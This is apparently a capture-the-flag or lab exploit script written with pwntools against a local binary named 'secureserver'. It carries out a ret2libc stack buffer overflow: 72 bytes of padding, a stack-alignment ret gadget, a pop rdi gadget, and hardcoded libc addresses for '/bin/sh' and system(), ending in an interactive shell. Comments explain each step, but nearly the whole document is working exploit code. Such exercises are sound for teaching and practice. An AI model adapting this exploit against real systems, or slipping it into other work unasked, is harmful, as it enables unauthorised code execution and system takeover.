from pwn import *

prcs = './secureserver'
elf = context.binary = ELF(prcs, checksec=False)
context.log_level = 'debug'

p = process(prcs)

# for this one we wanna redirect execution to a function called 'system' on the libc 
# we are going to give it '/bin/sh' as an argument so that it gets us a shell.

rsp_offset = 72

# with ASLR off the libc is located at the same @ each time
libc_base = 0x00007ffff7da4000
# these offsets should remain the same even with ASLR on
system = libc_base + 0x58750
binsh = libc_base + 0x1cb42f

pop_rdi = 0x40120b
ret = 0x401016 # without this i was getting a segfault instantly. This solves a stack alignment issue.

info("system: %#x", system)
info("/bin/sh: %#x", binsh)

payload = flat(
    asm('nop') * rsp_offset,
    ret,
    pop_rdi,
    binsh,
    system,
    0x4011ac
)

write('payload', payload)

p.sendlineafter(b':', payload)
p.interactive()